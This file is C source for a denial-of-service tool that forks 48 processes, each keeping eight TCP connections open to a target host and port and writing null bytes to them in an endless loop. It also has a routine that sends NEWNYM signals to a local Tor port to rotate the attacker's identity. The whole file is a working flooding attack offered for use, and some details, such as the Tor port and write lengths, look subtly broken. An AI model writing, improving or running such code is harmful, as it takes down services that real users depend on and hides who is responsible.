#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#define CONNECTIONS 8
#define THREADS 48
#define SLEEP_DURATION 300000  // microseconds

int make_socket(const char *host, const char *port) {
    struct addrinfo hints, *servinfo, *p;
    int sock, r;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if ((r = getaddrinfo(host, port, &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
        return -1;
    }

    for (p = servinfo; p != NULL; p = p->ai_next) {
        if ((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }
        if (connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
            close(sock);
            continue;
        }
        break;
    }

    if (p == NULL) {
        fprintf(stderr, "No connection could be made\n");
        freeaddrinfo(servinfo);
        return -1;
    }

    freeaddrinfo(servinfo);
    fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
    return sock;
}

void broke(int s) {
    fprintf(stderr, "Broken pipe signal caught\n");
}

void attack(const char *host, const char *port, int id) {
    int sockets[CONNECTIONS] = {0};
    int x, r;
    signal(SIGPIPE, broke);

    while (1) {
        for (x = 0; x < CONNECTIONS; x++) {
            if (sockets[x] == 0) {
                sockets[x] = make_socket(host, port);
                if (sockets[x] == -1) {
                    fprintf(stderr, "Socket creation failed\n");
                    continue;
                }
            }

            r = write(sockets[x], "\0", 1);
            if (r == -1) {
                fprintf(stderr, "[%i: Error sending data (%s)]\n", id, strerror(errno));
                close(sockets[x]);
                sockets[x] = make_socket(host, port);
            } else {
                fprintf(stderr, "[%i: Voly Sent]\n", id);
            }
        }
        usleep(SLEEP_DURATION);
    }
}

void cycle_identity() {
    int r;
    int socket = make_socket("localhost", "9050");
    if (socket == -1) {
        fprintf(stderr, "Failed to connect to TOR control port\n");
        return;
    }

    write(socket, "AUTHENTICATE \"\"\n", 16);
    while (1) {
        r = write(socket, "signal NEWNYM\n\x00", 16);
        if (r == -1) {
            fprintf(stderr, "Error sending NEWNYM signal\n");
            break;
        }
        fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM]\n", r);
        usleep(SLEEP_DURATION);
    }

    close(socket);
}

void handle_signal(int sig) {
    fprintf(stderr, "Received signal %d, exiting...\n", sig);
    exit(0);
}

int main(int argc, char **argv) {
    int x;
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_ip> <port>\n", argv[0]);
        cycle_identity();
        exit(EXIT_FAILURE);
    }

    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    for (x = 0; x < THREADS; x++) {
        if (fork() == 0) {
            attack(argv[1], argv[2], x);
            exit(0);
        }
        usleep(200000);
    }

    // ทำให้โปรเซสหลักรออยู่โดยไม่จบการทำงาน
    while (1) {
        pause();  // รอ signal เพื่อให้ทำงานต่อไปจนกว่าจะถูกหยุด
    }

    return 0;
}
